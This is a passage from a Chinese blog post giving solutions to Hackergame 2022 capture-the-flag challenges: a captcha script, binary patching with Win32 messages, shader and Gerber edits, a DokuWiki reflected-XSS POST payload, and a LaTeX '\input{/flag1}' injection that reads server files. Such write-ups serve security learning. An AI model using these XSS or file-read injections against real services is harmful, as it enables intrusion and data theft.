post_data <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>captcha1<span class="token operator">=</span>l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> captcha2<span class="token operator">=</span>l<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> captcha3<span class="token operator">=</span>l<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>
r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://202.38.93.111:10047/xcaptcha"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">)</span><span class="token punctuation">.</span>text

<span class="token comment"># post_data = f"captcha1={l[0]}&amp;captcha2={l[1]}&amp;captcha3={l[2]}"</span>
<span class="token comment"># headers = {"Content-Type": "application/x-www-form-urlencoded"}</span>
<span class="token comment"># r = s.post("http://202.38.93.111:10047/xcaptcha", data=post_data, headers=headers).text</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_afd9a3e77c}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>python requests 里，这个 post 如果传的是个 dict，那就自己会带上 <code>Content-Type: application/x-www-form-urlencoded</code> </p>
<p>不然自己拼接字符串的话，就得手动加上 headers 指定这个了</p>
<h2 id="旅行照片-2-0"><a href="#旅行照片-2-0" class="headerlink" title="旅行照片 2.0"></a>旅行照片 2.0</h2><blockquote>
<p>你的学长决定来一场蓄谋已久的旅行。通过他发给你的照片来看，酒店应该是又被他住下了。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/travel-photo-2.jpg" alt="travel-photo"></p>
<p>请回答问题以获取 flag。图片为手机拍摄的原始文件，未经任何处理。手机系统时间等信息正确可靠。</p>
</blockquote>
<h3 id="第一题：照片分析"><a href="#第一题：照片分析" class="headerlink" title="第一题：照片分析"></a>第一题：照片分析</h3><p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022205550621.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022205558847.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022205736694.png"></p>
<h3 id="第二题：社工实践"><a href="#第二题：社工实践" class="headerlink" title="第二题：社工实践"></a>第二题：社工实践</h3><p>日本的一个海边体育馆，体育馆上有字可以找到地点，旁边有个酒店</p>
<p>小米手机，搜 SM6115 可以拿到手机型号</p>
<p>飞机的话，按这个角度其实可以确定是往北飞的，机场在附近不远，大概是准备降落的</p>
<p>但是不想氪金买 flightradar24 大会员，摸了（</p>
<h2 id="Flag-自动机"><a href="#Flag-自动机" class="headerlink" title="Flag 自动机"></a>Flag 自动机</h2><blockquote>
<p>Hackergame 2022 组委会为大家搬来了一台能够自动获取 flag 的机器。然而，想要提取出其中的 flag 似乎没那么简单……</p>
<p>请点击下方的「打开/下载题目」按钮，从 flag 自动机中提取 flag。</p>
<p><strong>请选手注意：<code>flag_machine.zip</code> 中的 <code>flag_machine.exe.manifest</code> 仅为美化窗口使用，与本题解法无关。</strong></p>
</blockquote>
<p>哈哈，会自己跑的 <em>狠心夺取</em></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022211202731.png"></p>
<p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44018458/article/details/108430908">杭电CTF——逆向(3)</a></p>
<p>用 Spy++ 获取按钮的句柄，这软件在 VS 的 Tools 路径下有，叫 spyxx.exe 或者 spyxx_amd64.exe</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022214357342.png"></p>
<p>拿到句柄后用 win32api 发消息</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> win32api
<span class="token keyword">import</span> win32con

hWnd <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'001E0D4C'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
win32api<span class="token punctuation">.</span>SendMessage<span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span>win32con<span class="token punctuation">.</span>WM_LBUTTONDOWN<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
win32api<span class="token punctuation">.</span>SendMessage<span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span>win32con<span class="token punctuation">.</span>WM_LBUTTONUP<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里 pywin32 试了试，喵喵这边 304 版本会报错（ImportError: DLL load failed: 找不到指定的程序），试了下 300 可以</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">pywin32</span><span class="token operator">==</span><span class="token number">300</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>但是锅了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022214739926.png"></p>
<p>草，什么玩意。。然后试了试管理员模式运行，也不行。</p>
<p>于是又回去打开 IDA 逆向瞄了瞄</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233828324.png"></p>
<p>中文字符这里 Alt+A，然后选 UTF-16LE 修一下</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233806280.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233658639.png"></p>
<p>生成 flag 的逻辑应该是这样，但是不大会逆向。。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233646477.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233958528.png"></p>
<p>搜了下 Win32API，发现这个 <code>WndClass.lpfnWndProc</code> 对应的是窗口处理函数</p>
<p>对按键消息来说，鼠标的X和Y的坐标被压缩进 lParam 中。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022234115782.png"></p>
<p>感觉比较明显这里应该是取不到 114514 的，而且很有可能是故意玩梗的，突然想到不如 <strong>直接 patch 掉这部分</strong> 就完事了。</p>
<p>原来的逻辑是这样，左下角是提示需要管理员，右边的逻辑是成功拿 flag</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022232858868.png"></p>
<p>于是就不 jz 了，直接 jmp</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233103773.png"></p>
<p>修改之后就直接强制跳转到拿 flag 了。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233217176.png"></p>
<p>然后 Apply patch，再打开软件，重复上面的 win32api.SendMessage，这样就能拿到 flag 了。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221022233410037.png"></p>
<p><code>flag{Y0u_rea1ly_kn0w_Win32API_89ab91ac0c}</code></p>
<p>其实感觉后面这堆甚至也不需要，在处理 Msg 的这个跳转这里直接跳到输出 flag 的流程就完事了</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023004834001.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023005154740.png"></p>
<p>按照上面这样改，<code>cmp ax,2</code> 是判断 <code>放手离开</code>，patch 之后点这个按钮就直接输出 flag 了</p>
<hr>
<p>唉，赛后看了下 <a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/Flag%20%E8%87%AA%E5%8A%A8%E6%9C%BA/README.md">官方 wp</a>，这个 win32api 可以直接发他要的消息啊，比如官方的脚本：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    HWND target <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token comment">// 获取窗口句柄</span>
    target <span class="token operator">=</span> <span class="token function">FindWindowW</span><span class="token punctuation">(</span>L<span class="token string">"flag 自动机"</span><span class="token punctuation">,</span> L<span class="token string">"flag 自动机"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x"</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 发送消息</span>
    <span class="token function">PostMessageW</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token number">0x111</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以其实可以魔改下之前直接操作 win32api 的写法（比如 cubercsl 就这样解的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> win32con
<span class="token keyword">import</span> win32gui
hwnd <span class="token operator">=</span> win32gui<span class="token punctuation">.</span>FindWindow<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"flag 自动机"</span><span class="token punctuation">)</span>
win32gui<span class="token punctuation">.</span>SendMessage<span class="token punctuation">(</span>
    hwnd<span class="token punctuation">,</span>                           <span class="token comment"># hWnd</span>
    win32con<span class="token punctuation">.</span>WM_COMMAND<span class="token punctuation">,</span>            <span class="token comment"># Msg</span>
    win32con<span class="token punctuation">.</span>BN_CLICKED <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token operator">|</span> <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token comment"># wParam</span>
    <span class="token number">0x1bf52</span>                         <span class="token comment"># lParam</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/355878952">Windows下的程序及热键监视神器——Spy++</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Robot_Starscream/article/details/83046984">「 C++ 参数 」“(WPARAM wParam, LPARAM lParam)信息” 讲解</a></p>
</blockquote>
<h2 id="光与影"><a href="#光与影" class="headerlink" title="光与影"></a>光与影</h2><blockquote>
<p>冒险，就要不断向前！</p>
<p>在寂静的神秘星球上，继续前进，探寻 flag 的奥秘吧！</p>
<p>提示：题目代码编译和场景渲染需要一段时间（取决于你的机器配置），请耐心等待。如果你看到 “Your WebGL context has  lost.” 的提示，则可能需要更换浏览器或环境。目前我们已知在 Linux 环境下，使用 Intel 核显的 Chrome/Chromium  用户可能无法正常渲染。</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10121/">http://202.38.93.111:10121/</a></p>
</blockquote>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023014200236.png"></p>
<p>flag 被一层东西遮罩了，翻一下代码，发现是个在线编译的代码</p>
<p><code>fragment-shader.js</code> 里的这堆 <code>t{1,2,3,4,5}SDF</code> 函数应该就是对应于 flag 的字符啥的吧</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023014416803.png"></p>
<p><code>sceneSDF</code> 函数里调用 <code>t5SDF</code> 的这个 <code>p-</code> 就很可疑</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">float</span> <span class="token function">sceneSDF</span><span class="token punctuation">(</span>vec3 p<span class="token punctuation">,</span> out vec3 pColor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    pColor <span class="token operator">=</span> <span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    vec4 pH <span class="token operator">=</span> <span class="token function">mk_homo</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    vec4 pTO <span class="token operator">=</span> <span class="token function">mk_trans</span><span class="token punctuation">(</span><span class="token number">35.0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">20.0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">mk_scale</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">,</span> <span class="token number">1.5</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span> <span class="token operator">*</span> pH<span class="token punctuation">;</span>
    
    <span class="token keyword">float</span> t1 <span class="token operator">=</span> <span class="token function">t1SDF</span><span class="token punctuation">(</span>pTO<span class="token punctuation">.</span>xyz<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> t2 <span class="token operator">=</span> <span class="token function">t2SDF</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">mk_trans</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span> <span class="token operator">*</span> pTO<span class="token punctuation">)</span><span class="token punctuation">.</span>xyz<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> t3 <span class="token operator">=</span> <span class="token function">t3SDF</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">mk_trans</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">80.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span> <span class="token operator">*</span> pTO<span class="token punctuation">)</span><span class="token punctuation">.</span>xyz<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> t4 <span class="token operator">=</span> <span class="token function">t4SDF</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">mk_trans</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">106.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span> <span class="token operator">*</span> pTO<span class="token punctuation">)</span><span class="token punctuation">.</span>xyz<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> t5 <span class="token operator">=</span> <span class="token function">t5SDF</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">36.0</span><span class="token punctuation">,</span> <span class="token number">10.0</span><span class="token punctuation">,</span> <span class="token number">15.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">30.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">float</span> tmin <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">min</span><span class="token punctuation">(</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">)</span><span class="token punctuation">,</span> t3<span class="token punctuation">)</span><span class="token punctuation">,</span> t4<span class="token punctuation">)</span><span class="token punctuation">,</span> t5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> tmin<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 chrome 里开个 overrides，让浏览器从本地加载文件，替换掉原来从服务器加载的 js</p>
<p>把这里的 <code>p -</code> 给干掉，也就是变成 </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">float</span> t5 <span class="token operator">=</span> <span class="token function">t5SDF</span><span class="token punctuation">(</span><span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">36.0</span><span class="token punctuation">,</span> <span class="token number">10.0</span><span class="token punctuation">,</span> <span class="token number">15.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">vec3</span><span class="token punctuation">(</span><span class="token number">30.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后刷新，重新编译并渲染，乐，flag 真出来了！！！</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023014013786.png"></p>
<p><code>flag{SDF-i3-FuN!}</code></p>
<h2 id="线路板"><a href="#线路板" class="headerlink" title="线路板"></a>线路板</h2><blockquote>
<p>中午起床，看到室友的桌子上又多了一个正方形的盒子。快递标签上一如既往的写着：线路板。和往常一样，你“帮”室友拆开快递并抢先把板子把玩一番。可是突然，你注意到板子表面似乎写着些东西……看起来像是……flag？</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/circuit_boards.png" alt="circuit_boards"></p>
<p>可是只有开头的几个字母可以看清楚。你一时间不知所措。</p>
<p>幸运的是，你通过盒子上的联系方式找到了制作厂家，通过板子丝印上的序列号查出了室友的底细，并以放弃每月两次免费 PCB 打样包邮的机会为代价要来了这批带有 flag 的板子的生产文件。那这些文件里会不会包含着更多有关 flag 的信息呢？</p>
</blockquote>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023020043487.png"></p>
<p>一堆 gbr 文件</p>
<blockquote>
<p>GBR文件包含印刷电路板（PCB）Gerber格式的设计数据，这是许多PCB设计系统支持的行业标准文件格式。 它包含有关对板进行钻孔和铣削的说明，并包含有关板电气连接的信息。 PCB专业人员通常使用GBR文件从设计软件到制造机器安全地交换图像，钻孔和溃败数据。</p>
<p>Gerber格式既简单又紧凑，可存储精确描述PCB和2D图像的数据。 元数据 PCB制造所需的。 GBR格式最初由Gerber Systems开发，但现在由Ucamco维护。</p>
</blockquote>
<p>拿 AD 打开瞄一眼，想不到居然打 CTF 也能用到这玩意哈哈哈</p>
<p>或者用在线的 Gerber Viewer <a target="_blank" rel="noopener" href="https://www.altium.com/viewer/cn/">https://www.altium.com/viewer/cn/</a> 也行</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023021145677.png"></p>
<p>flag 确实在这个下面的</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023021141267.png"></p>
<p>看这个源码，感觉有点像数控机床那种 G 代码？</p>
<p>于是瞎几把删东西，把最开始这堆光圈啥的干掉，就露出下面的 flag 了</p>
<p>修改部分如下</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023022737683.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023022802320.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023022507910.png"></p>
<p><code>flag{8_1ayER_rogeRS_81ind_V1a}</code></p>
<h2 id="Flag-的痕迹"><a href="#Flag-的痕迹" class="headerlink" title="Flag 的痕迹"></a>Flag 的痕迹</h2><blockquote>
<p>小 Z 听说 Dokuwiki 配置很简单，所以在自己的机器上整了一份。可是不巧的是，他一不小心把珍贵的 flag 粘贴到了 wiki 首页提交了！他赶紧改好，并且也把历史记录（revisions）功能关掉了。</p>
<p>「这样就应该就不会泄漏 flag 了吧」，小 Z 如是安慰自己。</p>
<p>然而事实真的如此吗？</p>
<blockquote>
<p>（题目 Dokuwiki 版本基于 2022-07-31a “Igor”）</p>
</blockquote>
</blockquote>
<p>瞄了眼 CVE 列表</p>
<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-9794/Dokuwiki.html">https://www.cvedetails.com/vulnerability-list/vendor_id-9794/Dokuwiki.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2022-3123/">CVE-2022-3123</a> 这个就很可疑</p>
<blockquote>
<p>Cross-site Scripting (XSS) - Reflected in GitHub repository splitbrain/dokuwiki prior to 2022-07-31a.</p>
</blockquote>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023025449515.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/splitbrain/dokuwiki/issues/3761">Cross-Site-Scripting vulnerability in diff viewer  #3761</a></p>
<p><a target="_blank" rel="noopener" href="https://huntr.dev/bounties/d72a979b-57db-4201-9500-66b49a5c1345/">Reflected XSS via POST in splitbrain/dokuwiki</a></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023025643306.png"></p>
<p>改一改 payload</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/doku.php?id=start</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=5nlriqummcitbeg1fgjl3t5cuu; session=xxxxxxxxx; DOKU_PREFS=list%23thumbs</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">120</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip,deflate,br</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">202.38.93.111:15004</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">Keep-alive</span></span>

difftype=sidebyside'"()%26%25&lt;zzz&gt;&lt;ScRiPt%20&gt;alert(00)&lt;/ScRiPt&gt;&amp;do=diff&amp;do[diff]=1&amp;id=start&amp;rev2[0]=0&amp;rev2[1]=0&amp;sectok=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>来到了个对比的页面，在历史里 diff 一下就能找到原来的 flag 啦</p>
<p>最后的请求是</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/doku.php?id=start</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">202.38.93.111:15004</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">90</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:15004</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:15004/doku.php?id=start</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>

sectok=&amp;id=start&amp;do=diff&amp;difftype=sidebyside&amp;rev2%5B1%5D=1666320802&amp;rev2%5B0%5D=1665224461<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023030539974.png"></p>
<p><code> flag{d1gandFInD_d0kuw1k1_unexpectEd_API}</code></p>
<h2 id="LaTeX-机器人"><a href="#LaTeX-机器人" class="headerlink" title="LaTeX 机器人"></a>LaTeX 机器人</h2><blockquote>
<p>在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。</p>
<p>这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。</p>
<p>“LaTeX 又不是被编译执行的代码，这种东西不会有事的。”</p>
<p>物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。</p>
<p>那你能想办法获得服务器上放在根目录下的 flag 吗？</p>
<p><strong>纯文本</strong></p>
<p>第一个 flag 位于 <code>/flag1</code>，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。</p>
<p><strong>特殊字符混入</strong></p>
<p>第二个 flag 位于 <code>/flag2</code>，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（<code>_</code>）和井号（<code>#</code>）。你可能需要想些其他办法了。</p>
<p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/e0a8adbb-c53b-5519-ba96-07950baa8464/latexbot-backend.zip">LaTeX 图片生成后端的 Dockerfile 附件下载</a></p>
</blockquote>
<h3 id="纯文本"><a href="#纯文本" class="headerlink" title="纯文本"></a>纯文本</h3><p>给的模板文件 <code>base.tex</code></p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">[</span>preview<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">standalone</span><span class="token punctuation">}</span>
<span class="token function selector">\begin</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span>
<span class="token equation string">$$
$$</span>
<span class="token function selector">\end</span><span class="token punctuation">{</span><span class="token keyword">document</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考 <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">LaTex Injection</a></p>
<p><a target="_blank" rel="noopener" href="https://0day.work/hacking-with-latex/">Hacking with LaTeX</a></p>
<p>直接构造 input 读文件就好了</p>
<pre class="line-numbers language-none"><code class="language-none">\input{/flag1}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023031502344.png"></p>
<p><code>flag{becAr3fu11dUd3a71669bc56}</code></p>
<h3 id="特殊字符混入"><a href="#特殊字符混入" class="headerlink" title="特殊字符混入"></a>特殊字符混入</h3><p>上面的 trick 里有了个参考的</p>
